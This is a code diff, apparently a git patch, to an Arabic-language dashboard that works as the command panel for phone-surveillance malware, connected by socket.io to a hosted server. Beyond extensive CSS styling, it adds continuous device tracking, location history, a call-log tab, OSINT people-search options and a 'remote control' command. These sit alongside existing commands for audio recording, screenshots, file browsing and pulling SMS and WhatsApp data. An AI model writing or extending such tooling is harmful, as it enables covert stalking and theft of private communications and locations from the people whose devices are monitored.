@@ -35,10 +35,23 @@
 
 body {
   font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-  background: var(--dark-bg);
+  background: linear-gradient(135deg, var(--dark-bg) 0%, var(--darker-bg) 100%);
   color: var(--text-color);
   line-height: 1.6;
   overflow-x: hidden;
+  position: relative;
+}
+
+body::before {
+  content: "";
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgdmlld0JveD0iMCAwIDYwIDYwIj48ZyBmaWxsPSJub25lIiBzdHJva2U9IiMwMGZmY2MiIHN0cm9rZS13aWR0aD0iMC41IiBzdHJva2Utb3BhY2l0eT0iMC4xIj48cGF0aCBkPSJNIDAgMCBMIDYwIDYwIE0gNjAgMCBMIDAgNjAiLz48L2c+PC9zdmc+');
+  z-index: -1;
+  opacity: 0.1;
 }
 
 .container {
@@ -55,13 +68,16 @@ body {
 /* Header Styles */
 header {
   grid-area: header;
-  background: var(--darker-bg);
+  background: rgba(13, 27, 42, 0.95);
   padding: 0 20px;
   display: flex;
   align-items: center;
   justify-content: space-between;
   border-bottom: 1px solid var(--border-color);
   box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+  backdrop-filter: blur(10px);
+  position: relative;
+  z-index: 100;
 }
 
 .logo {
@@ -73,6 +89,7 @@ header {
   font-size: 22px;
   margin: 0;
   color: var(--primary-color);
+  text-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
 }
 
 .logo span {
@@ -96,15 +113,17 @@ header {
   justify-content: center;
   color: var(--primary-color);
   font-size: 18px;
+  box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
 }
 
 /* Sidebar Styles */
 .sidebar {
   grid-area: sidebar;
-  background: var(--darker-bg);
+  background: rgba(13, 27, 42, 0.95);
   border-right: 1px solid var(--border-color);
   padding: 20px 0;
   overflow-y: auto;
+  backdrop-filter: blur(10px);
 }
 
 .sidebar-menu {
@@ -123,12 +142,29 @@ header {
   text-decoration: none;
   transition: all 0.3s;
   border-left: 4px solid transparent;
+  position: relative;
 }
 
 .sidebar-menu a:hover, .sidebar-menu a.active {
   background: rgba(0, 255, 204, 0.1);
   border-left-color: var(--primary-color);
   color: var(--primary-color);
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.5);
+}
+
+.sidebar-menu a::before {
+  content: "";
+  position: absolute;
+  left: 0;
+  top: 0;
+  height: 100%;
+  width: 0;
+  background: linear-gradient(90deg, rgba(0, 255, 204, 0.2), transparent);
+  transition: width 0.3s;
+}
+
+.sidebar-menu a:hover::before {
+  width: 100%;
 }
 
 .sidebar-menu i {
@@ -143,7 +179,8 @@ header {
   grid-area: main;
   padding: 20px;
   overflow-y: auto;
-  background: var(--dark-bg);
+  background: rgba(7, 16, 33, 0.8);
+  backdrop-filter: blur(5px);
 }
 
 .panel {
@@ -172,6 +209,7 @@ header {
 .panel-header h2 {
   color: var(--primary-color);
   font-size: 24px;
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 .stats-cards {
@@ -188,6 +226,13 @@ header {
   box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
   display: flex;
   align-items: center;
+  transition: transform 0.3s, box-shadow 0.3s;
+  border: 1px solid rgba(0, 255, 204, 0.1);
+}
+
+.stat-card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2), 0 0 15px rgba(0, 255, 204, 0.2);
 }
 
 .stat-icon {
@@ -201,12 +246,14 @@ header {
   margin-left: 15px;
   font-size: 24px;
   color: var(--primary-color);
+  box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
 }
 
 .stat-info h3 {
   font-size: 28px;
   margin: 0;
   color: var(--primary-color);
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 .stat-info p {
@@ -227,11 +274,13 @@ header {
   border-radius: 8px;
   overflow: hidden;
   box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-  transition: transform 0.3s;
+  transition: transform 0.3s, box-shadow 0.3s;
+  border: 1px solid rgba(0, 255, 204, 0.1);
 }
 
 .device-card:hover {
   transform: translateY(-5px);
+  box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2), 0 0 15px rgba(0, 255, 204, 0.2);
 }
 
 .device-header {
@@ -246,6 +295,7 @@ header {
   font-weight: bold;
   color: var(--primary-color);
   font-size: 16px;
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 .device-status {
@@ -292,6 +342,23 @@ header {
   align-items: center;
   justify-content: center;
   transition: all 0.3s;
+  position: relative;
+  overflow: hidden;
+}
+
+.btn::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+  transition: left 0.5s;
+}
+
+.btn:hover::before {
+  left: 100%;
 }
 
 .btn i {
@@ -305,6 +372,7 @@ header {
 
 .btn-primary:hover {
   background: #00e6b8;
+  box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
 }
 
 .btn-secondary {
@@ -314,6 +382,7 @@ header {
 
 .btn-secondary:hover {
   background: #0b2e25;
+  box-shadow: 0 0 10px rgba(13, 59, 51, 0.5);
 }
 
 /* Map Panel */
@@ -331,6 +400,7 @@ header {
 #map {
   height: 100%;
   width: 100%;
+  z-index: 10;
 }
 
 .map-controls {
@@ -352,6 +422,7 @@ header {
   display: flex;
   align-items: center;
   font-size: 14px;
+  transition: all 0.3s;
 }
 
 .map-btn i {
@@ -361,6 +432,7 @@ header {
 .map-btn:hover {
   background: var(--primary-color);
   color: var(--darker-bg);
+  box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
 }
 
 /* Data Panel */
@@ -370,6 +442,7 @@ header {
   padding: 20px;
   box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
   margin-bottom: 20px;
+  border: 1px solid rgba(0, 255, 204, 0.1);
 }
 
 .data-tabs {
@@ -382,11 +455,13 @@ header {
   padding: 10px 15px;
   cursor: pointer;
   border-bottom: 2px solid transparent;
+  transition: all 0.3s;
 }
 
 .data-tab.active {
   border-bottom: 2px solid var(--primary-color);
   color: var(--primary-color);
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 .data-content {
@@ -415,6 +490,7 @@ header {
 
 .data-table th {
   color: var(--primary-color);
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 /* Logs Panel */
@@ -425,6 +501,7 @@ header {
   height: 500px;
   overflow-y: auto;
   box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  border: 1px solid rgba(0, 255, 204, 0.1);
 }
 
 .log-entry {
@@ -432,6 +509,11 @@ header {
   border-bottom: 1px solid var(--border-color);
   display: flex;
   align-items: center;
+  transition: background 0.3s;
+}
+
+.log-entry:hover {
+  background: rgba(0, 255, 204, 0.05);
 }
 
 .log-entry:last-child {
@@ -443,6 +525,7 @@ header {
   margin-left: 10px;
   font-weight: bold;
   min-width: 90px;
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 .log-message {
@@ -460,6 +543,7 @@ header {
   border-radius: 8px;
   padding: 20px;
   box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  border: 1px solid rgba(0, 255, 204, 0.1);
 }
 
 .command-form {
@@ -477,6 +561,7 @@ header {
   margin-bottom: 5px;
   color: var(--primary-color);
   font-weight: bold;
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 .form-control {
@@ -486,11 +571,13 @@ header {
   border: 1px solid var(--border-color);
   background: var(--darker-bg);
   color: var(--text-color);
+  transition: all 0.3s;
 }
 
 .form-control:focus {
   outline: none;
   border-color: var(--primary-color);
+  box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
 }
 
 .btn-block {
@@ -506,6 +593,7 @@ header {
   border-radius: 8px;
   padding: 20px;
   box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+  border: 1px solid rgba(0, 255, 204, 0.1);
 }
 
 .search-box {
@@ -520,6 +608,13 @@ header {
   border: 1px solid var(--border-color);
   background: var(--darker-bg);
   color: var(--text-color);
+  transition: all 0.3s;
+}
+
+.search-input:focus {
+  outline: none;
+  border-color: var(--primary-color);
+  box-shadow: 0 0 10px rgba(0, 255, 204, 0.3);
 }
 
 .search-btn {
@@ -530,6 +625,12 @@ header {
   color: var(--darker-bg);
   cursor: pointer;
   font-weight: bold;
+  transition: all 0.3s;
+}
+
+.search-btn:hover {
+  background: #00e6b8;
+  box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
 }
 
 .results-container {
@@ -542,6 +643,11 @@ header {
   padding: 15px;
   margin-bottom: 15px;
   border-left: 4px solid var(--primary-color);
+  transition: transform 0.3s;
+}
+
+.result-card:hover {
+  transform: translateX(-5px);
 }
 
 .result-source {
@@ -550,6 +656,7 @@ header {
   margin-bottom: 8px;
   display: flex;
   align-items: center;
+  text-shadow: 0 0 5px rgba(0, 255, 204, 0.3);
 }
 
 .result-source i {
@@ -559,7 +666,7 @@ header {
 /* Footer Styles */
 footer {
   grid-area: footer;
-  background: var(--darker-bg);
+  background: rgba(13, 27, 42, 0.95);
   display: flex;
   align-items: center;
   justify-content: center;
@@ -567,6 +674,7 @@ footer {
   font-size: 14px;
   color: var(--text-color);
   opacity: 0.7;
+  backdrop-filter: blur(10px);
 }
 
 /* Connection Status */
@@ -583,16 +691,19 @@ footer {
 .connected {
   background: var(--success-color);
   color: white;
+  box-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
 }
 
 .connecting {
   background: var(--warning-color);
   color: white;
+  box-shadow: 0 0 10px rgba(243, 156, 18, 0.5);
 }
 
 .disconnected {
   background: var(--danger-color);
   color: white;
+  box-shadow: 0 0 10px rgba(231, 76, 60, 0.5);
 }
 
 /* Data Visualization */
@@ -602,6 +713,18 @@ footer {
   padding: 15px;
   margin-top: 20px;
   height: 300px;
+  border: 1px solid rgba(0, 255, 204, 0.1);
+}
+
+/* Pulse animation for active devices */
+@keyframes pulse {
+  0% { box-shadow: 0 0 0 0 rgba(0, 255, 204, 0.7); }
+  70% { box-shadow: 0 0 0 10px rgba(0, 255, 204, 0); }
+  100% { box-shadow: 0 0 0 0 rgba(0, 255, 204, 0); }
+}
+
+.pulse {
+  animation: pulse 2s infinite;
 }
 
 /* Responsive Design */
@@ -747,7 +870,10 @@ footer {
     <section id="panel-map" class="panel">
       <div class="panel-header">
         <h2><i class="fas fa-map-marked-alt"></i> الخريطة الاستخباراتية</h2>
-        <button class="btn btn-primary" id="refreshMap"><i class="fas fa-sync-alt"></i> تحديث الخريطة</button>
+        <div>
+          <button class="btn btn-primary" id="trackDevice"><i class="fas fa-crosshairs"></i> تتبع جهاز</button>
+          <button class="btn btn-primary" id="refreshMap"><i class="fas fa-sync-alt"></i> تحديث الخريطة</button>
+        </div>
       </div>
       
       <div class="map-container">
@@ -756,6 +882,7 @@ footer {
           <button class="map-btn" id="zoomIn"><i class="fas fa-plus"></i></button>
           <button class="map-btn" id="zoomOut"><i class="fas fa-minus"></i></button>
           <button class="map-btn" id="locateMe"><i class="fas fa-crosshairs"></i></button>
+          <button class="map-btn" id="searchLocation"><i class="fas fa-search-location"></i></button>
         </div>
       </div>
       
@@ -764,6 +891,7 @@ footer {
         <div class="data-tabs">
           <div class="data-tab active" data-tab="devices-list">قائمة الأجهزة</div>
           <div class="data-tab" data-tab="devices-stats">إحصائيات</div>
+          <div class="data-tab" data-tab="location-history">سجل المواقع</div>
         </div>
         <div class="data-content active" id="devices-list">
           <table class="data-table">
@@ -773,11 +901,12 @@ footer {
                 <th>النموذج</th>
                 <th>الموقع</th>
                 <th>الحالة</th>
+                <th>الإجراءات</th>
               </tr>
             </thead>
             <tbody id="map-devices-list">
               <tr>
-                <td colspan="4" style="text-align: center;">لا توجد أجهزة على الخريطة</td>
+                <td colspan="5" style="text-align: center;">لا توجد أجهزة على الخريطة</td>
               </tr>
             </tbody>
           </table>
@@ -813,6 +942,23 @@ footer {
             </div>
           </div>
         </div>
+        <div class="data-content" id="location-history">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>الجهاز</th>
+                <th>الموقع</th>
+                <th>الوقت</th>
+                <th>المدة</th>
+              </tr>
+            </thead>
+            <tbody id="location-history-data">
+              <tr>
+                <td colspan="4" style="text-align: center;">لا توجد بيانات موقع سابقة</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
       </div>
     </section>
     
@@ -829,6 +975,7 @@ footer {
           <div class="data-tab" data-tab="messages">الرسائل</div>
           <div class="data-tab" data-tab="locations">المواقع</div>
           <div class="data-tab" data-tab="media">الوسائط</div>
+          <div class="data-tab" data-tab="calls">المكالمات</div>
         </div>
         
         <div class="data-content active" id="contacts">
@@ -905,6 +1052,25 @@ footer {
             </tbody>
           </table>
         </div>
+        
+        <div class="data-content" id="calls">
+          <table class="data-table">
+            <thead>
+              <tr>
+                <th>النوع</th>
+                <th>الرقم</th>
+                <th>المدة</th>
+                <th>التاريخ</th>
+                <th>المصدر</th>
+              </tr>
+            </thead>
+            <tbody id="calls-data">
+              <tr>
+                <td colspan="5" style="text-align: center;">لا توجد بيانات</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
       </div>
     </section>
     
@@ -957,6 +1123,8 @@ footer {
               <option value="takeScreenshot">التقاط لقطة شاشة</option>
               <option value="recordAudio">تسجيل صوتي</option>
               <option value="getFiles">استكشاف الملفات</option>
+              <option value="trackContinuous">تتبع مستمر</option>
+              <option value="remoteControl">تحكم عن بعد</option>
             </select>
           </div>
           
@@ -983,6 +1151,23 @@ footer {
         <div class="search-box">
           <input type="text" id="osintInput" class="search-input" placeholder="أدخل اسم، بريد إلكتروني، رقم هاتف أو معرف">
           <button id="osintSearchBtn" class="search-btn"><i class="fas fa-search"></i> بحث</button>
+        </div>
+        
+        <div class="search-options" style="margin-bottom: 20px;">
+          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <label style="display: flex; align-items: center;">
+              <input type="checkbox" id="searchWeb" checked> الويب
+            </label>
+            <label style="display: flex; align-items: center;">
+              <input type="checkbox" id="searchSocial"> وسائل التواصل
+            </label>
+            <label style="display: flex; align-items: center;">
+              <input type="checkbox" id="searchDB"> قواعد البيانات
+            </label>
+            <label style="display: flex; align-items: center;">
+              <input type="checkbox" id="searchImages"> تحليل الصور
+            </label>
+          </div>
         </div>
         
         <div class="results-container" id="osintResults">
@@ -1067,6 +1252,35 @@ footer {
   </footer>
 </div>
 
+<!-- Modal for location search -->
+<div id="locationSearchModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
+  <div style="background: var(--card-bg); padding: 20px; border-radius: 8px; width: 400px; max-width: 90%;">
+    <h3 style="margin-bottom: 15px; color: var(--primary-color);"><i class="fas fa-search-location"></i> بحث عن موقع</h3>
+    <input type="text" id="locationSearchInput" class="form-control" placeholder="أدخل اسم المدينة أو العنوان" style="margin-bottom: 15px;">
+    <div style="display: flex; gap: 10px; justify-content: flex-end;">
+      <button class="btn btn-secondary" id="cancelLocationSearch">إلغاء</button>
+      <button class="btn btn-primary" id="confirmLocationSearch">بحث</button>
+    </div>
+  </div>
+</div>
+
+<!-- Modal for device tracking -->
+<div id="trackDeviceModal" style="display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;">
+  <div style="background: var(--card-bg); padding: 20px; border-radius: 8px; width: 400px; max-width: 90%;">
+    <h3 style="margin-bottom: 15px; color: var(--primary-color);"><i class="fas fa-crosshairs"></i> تتبع جهاز</h3>
+    <div class="form-group">
+      <label for="trackDeviceSelect">اختر الجهاز</label>
+      <select id="trackDeviceSelect" class="form-control">
+        <option value="">-- اختر جهازا --</option>
+      </select>
+    </div>
+    <div style="display: flex; gap: 10px; justify-content: flex-end;">
+      <button class="btn btn-secondary" id="cancelTrackDevice">إلغاء</button>
+      <button class="btn btn-primary" id="confirmTrackDevice">تتبع</button>
+    </div>
+  </div>
+</div>
+
 <script src="/socket.io/socket.io.js"></script>
 <script>
 // Initialize socket connection
@@ -1095,8 +1309,21 @@ const sampleData = {
     { type: "صورة", name: "IMG_20231015.jpg", size: "2.5MB", source: "Device-001", date: "2023-10-15 10:22" },
     { type: "فيديو", name: "VID_20231015.mp4", size: "15.7MB", source: "Device-002", date: "2023-10-15 11:30" },
     { type: "صورة", name: "IMG_20231015_2.jpg", size: "3.1MB", source: "Device-001", date: "2023-10-15 12:45" }
+  ],
+  calls: [
+    { type: "صادر", number: "+966511112222", duration: "2:30", date: "2023-10-15 09:15", source: "Device-001" },
+    { type: "وارد", number: "+966533334444", duration: "5:12", date: "2023-10-15 10:22", source: "Device-001" },
+    { type: "فائت", number: "+966512345678", duration: "0:00", date: "2023-10-15 11:05", source: "Device-002" }
   ]
 };
+
+// بيانات المواقع السابقة
+const locationHistory = [
+  { device: "Device-001", coordinates: "24.7136, 46.6753", address: "الرياض، السعودية", time: "2023-10-15 12:30", duration: "2h 15m" },
+  { device: "Device-001", coordinates: "24.8090, 46.7060", address: "حي النخيل، الرياض", time: "2023-10-15 10:15", duration: "1h 45m" },
+  { device: "Device-002", coordinates: "21.5433, 39.1728", address: "جدة، السعودية", time: "2023-10-15 13:45", duration: "3h 20m" },
+  { device: "Device-003", coordinates: "26.4207, 50.0888", address: "الدمام، السعودية", time: "2023-10-15 14:20", duration: "45m" }
+];
 
 function connectSocket() {
   socket = io('https://projectd-vu1m.onrender.com', { 
@@ -1233,6 +1460,7 @@ const locatedDevicesEl = document.getElementById('located-devices');
 const dataPointsEl = document.getElementById('data-points');
 const connectionStatusEl = document.getElementById('connectionStatus');
 const refreshMapBtn = document.getElementById('refreshMap');
+const trackDeviceBtn = document.getElementById('trackDevice');
 const noDevicesMessage = document.getElementById('no-devices-message');
 const commandForm = document.getElementById('command-form');
 const exportDataBtn = document.getElementById('exportData');
@@ -1240,9 +1468,20 @@ const exportLogsBtn = document.getElementById('export-logs');
 const zoomInBtn = document.getElementById('zoomIn');
 const zoomOutBtn = document.getElementById('zoomOut');
 const locateMeBtn = document.getElementById('locateMe');
+const searchLocationBtn = document.getElementById('searchLocation');
+const locationSearchModal = document.getElementById('locationSearchModal');
+const locationSearchInput = document.getElementById('locationSearchInput');
+const cancelLocationSearch = document.getElementById('cancelLocationSearch');
+const confirmLocationSearch = document.getElementById('confirmLocationSearch');
+const trackDeviceModal = document.getElementById('trackDeviceModal');
+const trackDeviceSelect = document.getElementById('trackDeviceSelect');
+const cancelTrackDevice = document.getElementById('cancelTrackDevice');
+const confirmTrackDevice = document.getElementById('confirmTrackDevice');
 
 const devicesMap = {}; 
 let map, markers = {};
+let trackedDevice = null;
+let trackingInterval = null;
 
 // Initialize the application
 document.addEventListener('DOMContentLoaded', function() {
@@ -1301,6 +1540,20 @@ document.addEventListener('DOMContentLoaded', function() {
     addLog('تم تحديث الخريطة', 'info');
   });
   
+  // Track device button
+  trackDeviceBtn.addEventListener('click', () => {
+    // Populate the track device select
+    trackDeviceSelect.innerHTML = '<option value="">-- اختر جهازا --</option>';
+    Object.keys(devicesMap).forEach(deviceId => {
+      const opt = document.createElement('option');
+      opt.value = deviceId;
+      opt.textContent = deviceId;
+      trackDeviceSelect.appendChild(opt);
+    });
+    
+    trackDeviceModal.style.display = 'flex';
+  });
+  
   // Map controls
   zoomInBtn.addEventListener('click', () => {
     if (map) map.zoomIn();
@@ -1315,6 +1568,7 @@ document.addEventListener('DOMContentLoaded', function() {
       navigator.geolocation.getCurrentPosition(
         position => {
           map.setView([position.coords.latitude, position.coords.longitude], 13);
+          addLog('تم تحديد موقعك على الخريطة', 'success');
         },
         error => {
           addLog('فشل في الحصول على الموقع الحالي: ' + error.message, 'error');
@@ -1323,12 +1577,45 @@ document.addEventListener('DOMContentLoaded', function() {
     }
   });
   
+  searchLocationBtn.addEventListener('click', () => {
+    locationSearchModal.style.display = 'flex';
+  });
+  
+  // Location search modal handlers
+  cancelLocationSearch.addEventListener('click', () => {
+    locationSearchModal.style.display = 'none';
+  });
+  
+  confirmLocationSearch.addEventListener('click', () => {
+    const query = locationSearchInput.value.trim();
+    if (query) {
+      searchLocation(query);
+    }
+    locationSearchModal.style.display = 'none';
+  });
+  
+  // Track device modal handlers
+  cancelTrackDevice.addEventListener('click', () => {
+    trackDeviceModal.style.display = 'none';
+  });
+  
+  confirmTrackDevice.addEventListener('click', () => {
+    const deviceId = trackDeviceSelect.value;
+    if (deviceId) {
+      startTrackingDevice(deviceId);
+    }
+    trackDeviceModal.style.display = 'none';
+  });
+  
   // Add some initial logs
   addLog('تم تحميل لوحة التحكم بنجاح', 'success');
   addLog('جاري الاتصال بالسيرفر...', 'info');
   
   // Load sample data
   loadSampleData();
+  
+  // Load location history
+  loadLocationHistory();
   
   // Initialize socket connection
   connectSocket();
@@ -1394,6 +1681,95 @@ function loadSampleData() {
     `;
     mediaTable.appendChild(row);
   });
+  
+  // Load calls
+  const callsTable = document.getElementById('calls-data');
+  callsTable.innerHTML = '';
+  sampleData.calls.forEach(call => {
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${call.type}</td>
+      <td>${call.number}</td>
+      <td>${call.duration}</td>
+      <td>${call.date}</td>
+      <td>${call.source}</td>
+    `;
+    callsTable.appendChild(row);
+  });
+}
+
+// Load location history
+function loadLocationHistory() {
+  const locationHistoryTable = document.getElementById('location-history-data');
+  locationHistoryTable.innerHTML = '';
+  locationHistory.forEach(location => {
+    const row = document.createElement('tr');
+    row.innerHTML = `
+      <td>${location.device}</td>
+      <td>${location.address}</td>
+      <td>${location.time}</td>
+      <td>${location.duration}</td>
+    `;
+    locationHistoryTable.appendChild(row);
+  });
+}
+
+// Search location using Nominatim (OpenStreetMap)
+function searchLocation(query) {
+  addLog(`جاري البحث عن: ${query}`, 'info');
+  
+  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}&accept-language=ar`)
+    .then(response => response.json())
+    .then(data => {
+      if (data && data.length > 0) {
+        const result = data[0];
+        const lat = parseFloat(result.lat);
+        const lon = parseFloat(result.lon);
+        
+        if (map) {
+          map.setView([lat, lon], 13);
+          L.marker([lat, lon]).addTo(map)
+            .bindPopup(`<b>${result.display_name}</b>`)
+            .openPopup();
+          
+          addLog(`تم العثور على الموقع: ${result.display_name}`, 'success');
+        }
+      } else {
+        addLog('لم يتم العثور على الموقع', 'warning');
+      }
+    })
+    .catch(error => {
+      console.error('Error searching location:', error);
+      addLog('خطأ في البحث عن الموقع', 'error');
+    });
+}
+
+// Start tracking a device
+function startTrackingDevice(deviceId) {
+  if (trackingInterval) {
+    clearInterval(trackingInterval);
+  }
+  
+  trackedDevice = deviceId;
+  addLog(`بدء تتبع الجهاز: ${deviceId}`, 'info');
+  
+  // Simulate continuous tracking (in a real system, this would be done via socket)
+  trackingInterval = setInterval(() => {
+    if (devicesMap[trackedDevice]) {
+      // Simulate movement
+      const lat = 24.7136 + (Math.random() - 0.5) * 0.01;
+      const lon = 46.6753 + (Math.random() - 0.5) * 0.01;
+      
+      const newLocation = {
+        lat: lat,
+        lon: lon,
+        address: "موقع متحرك (" + new Date().toLocaleTimeString() + ")"
+      };
+      
+      updateMapWithDevice(trackedDevice, newLocation);
+      addLog(`تحديث موقع الجهاز: ${trackedDevice}`, 'info');
+    }
+  }, 10000); // Update every 10 seconds
 }
 
 // Initialize analysis charts
@@ -1473,10 +1849,16 @@ function updateMapWithDevice(deviceId, locationData) {
   
   if (markers[deviceId]) {
     markers[deviceId].setLatLng([locationData.lat, locationData.lon]);
+    markers[deviceId].setPopupContent(`<b>${deviceId}</b><br>${locationData.address || ''}<br>${new Date().toLocaleTimeString()}`);
   } else {
     markers[deviceId] = L.marker([locationData.lat, locationData.lon])
       .addTo(map)
-      .bindPopup(`<b>${deviceId}</b><br>${locationData.address || ''}`);
+      .bindPopup(`<b>${deviceId}</b><br>${locationData.address || ''}<br>${new Date().toLocaleTimeString()}`);
+    
+    // Add pulse animation for tracked device
+    if (deviceId === trackedDevice) {
+      markers[deviceId]._icon.classList.add('pulse');
+    }
   }
   
   // Update map devices list
@@ -1492,7 +1874,7 @@ function updateMapDevicesList() {
   document.getElementById('map-devices-count').textContent = devicesCount;
   
   if (devicesCount === 0) {
-    devicesList.innerHTML = '<tr><td colspan="4" style="text-align: center;">لا توجد أجهزة على الخريطة</td></tr>';
+    devicesList.innerHTML = '<tr><td colspan="5" style="text-align: center;">لا توجد أجهزة على الخريطة</td></tr>';
     return;
   }
   
@@ -1505,7 +1887,11 @@ function updateMapDevicesList() {
       <td>${deviceId}</td>
       <td>${devicesMap[deviceId]?.querySelector('.device-info div:first-child')?.textContent || 'غير معروف'}</td>
       <td>${latlng.lat.toFixed(4)}, ${latlng.lng.toFixed(4)}</td>
-      <td><span class="device-status">نشط</span></td>
+      <td><span class="device-status">${deviceId === trackedDevice ? 'جاري التتبع' : 'نشط'}</span></td>
+      <td>
+        <button class="btn btn-primary" onclick="focusOnDevice('${deviceId}')"><i class="fas fa-crosshairs"></i></button>
+        <button class="btn btn-secondary" onclick="requestLocation('${deviceId}')"><i class="fas fa-sync-alt"></i></button>
+      </td>
     `;
     devicesList.appendChild(row);
   });
@@ -1513,6 +1899,15 @@ function updateMapDevicesList() {
   // Update stats
   document.getElementById('map-countries').textContent = "1"; // يمكن تحسين هذا لاحتساب الدول الفعلية
   document.getElementById('map-cities').textContent = Math.min(3, devicesCount); // مثال
+}
+
+// Focus on a specific device on the map
+function focusOnDevice(deviceId) {
+  if (markers[deviceId] && map) {
+    map.setView(markers[deviceId].getLatLng(), 15);
+    markers[deviceId].openPopup();
+    addLog(`تم التركيز على الجهاز: ${deviceId}`, 'info');
+  }
 }
 
 // Update devices count
@@ -1566,7 +1961,7 @@ function renderDevice(device) {
   deviceCard.innerHTML = `
     <div class="device-header">
       <div class="device-id">${device.id}</div>
-      <div class="device-status">نشط</div>
+      <div class="device-status">${device.id === trackedDevice ? 'جاري التتبع' : 'نشط'}</div>
     </div>
     <div class="device-body">
       <div class="device-info">
@@ -1584,6 +1979,7 @@ function renderDevice(device) {
         <button class="btn btn-secondary" onclick="requestCallLog('${device.id}')"><i class="fas fa-phone"></i> المكالمات</button>
         <button class="btn btn-secondary" onclick="requestSMS('${device.id}')"><i class="fas fa-sms"></i> الرسائل</button>
         <button class="btn btn-secondary" onclick="requestWhatsappDB('${device.id}')"><i class="fas fa-comment"></i> واتساب</button>
+        <button class="btn btn-primary" onclick="startTrackingDevice('${device.id}')"><i class="fas fa-crosshairs"></i> تتبع</button>
       </div>
     </div>
   `;
